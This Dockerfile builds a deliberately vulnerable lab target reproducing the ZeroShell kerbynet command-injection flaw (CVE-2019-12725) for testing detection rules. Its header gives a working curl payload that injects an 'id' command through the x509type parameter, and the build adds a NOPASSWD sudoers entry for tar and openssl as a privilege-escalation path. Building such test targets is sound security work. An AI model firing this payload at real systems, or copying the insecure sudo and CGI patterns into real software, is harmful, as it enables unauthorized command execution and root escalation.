# =============================================================================
#  Minimal vulnerable reproduction of CVE-2019-12725 (ZeroShell kerbynet RCE)
# =============================================================================
#  This is NOT a copy of ZeroShell — the real distribution is unmaintained and
#  ~700 MB. This Dockerfile reproduces ONLY the vulnerable code shape:
#    1. Apache 2 mod_cgi handler at /cgi-bin/kerbynet
#    2. A Bash CGI that mirrors the unsafe shell concatenation found in the
#       original product (Section=NoAuthREQ → x509view → sudo openssl ...)
#    3. sudoers entry allowing the apache user to NOPASSWD `tar` (GTFOBins)
#
#  Goal: provide a reproducible test target for Sigma/Suricata rules and the
#  exploit.py / extract_iocs.py tools, without redistributing copyrighted code.
#
#  Build:    docker build -t zeroshell-cve-2019-12725 .
#  Run:      docker run --rm -p 8080:80 zeroshell-cve-2019-12725
#  Test:     curl 'http://localhost:8080/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='"'"'%0Aid%0A'"'"
# =============================================================================
FROM debian:bookworm-slim

LABEL maintainer="colorfulwhitez"
LABEL cve="CVE-2019-12725"
LABEL purpose="security-research"

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
        apache2 \
        sudo \
        coreutils \
        tar \
        openssl \
        ca-certificates \
        bash \
        curl \
        procps \
    && rm -rf /var/lib/apt/lists/*

# Enable CGI
RUN a2enmod cgi

# Install vulnerable CGI handler
COPY kerbynet.cgi /usr/lib/cgi-bin/kerbynet
RUN chmod 755 /usr/lib/cgi-bin/kerbynet \
    && ln -s /usr/lib/cgi-bin /cgi-bin

# Sudoers entry that mirrors the original ZeroShell footgun:
#   apache may run /etc/sudo openssl verify ... and /etc/sudo tar ... NOPASSWD.
# Install a symlink so the CGI's `/etc/sudo` path resolves to /usr/bin/sudo.
RUN ln -s /usr/bin/sudo /etc/sudo \
    && echo "www-data ALL=(root) NOPASSWD: /usr/bin/openssl, /usr/bin/tar" \
        > /etc/sudoers.d/zeroshell-vuln \
    && chmod 440 /etc/sudoers.d/zeroshell-vuln

# Apache config — keep error_log noisy for blue-team learning
RUN sed -i 's|LogLevel warn|LogLevel info|' /etc/apache2/apache2.conf \
    && echo 'ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/' >> /etc/apache2/apache2.conf

EXPOSE 80

# Make Apache log to stdout/stderr for `docker logs`
RUN ln -sf /proc/self/fd/1 /var/log/apache2/access.log \
    && ln -sf /proc/self/fd/2 /var/log/apache2/error.log

CMD ["/usr/sbin/apache2ctl", "-DFOREGROUND"]
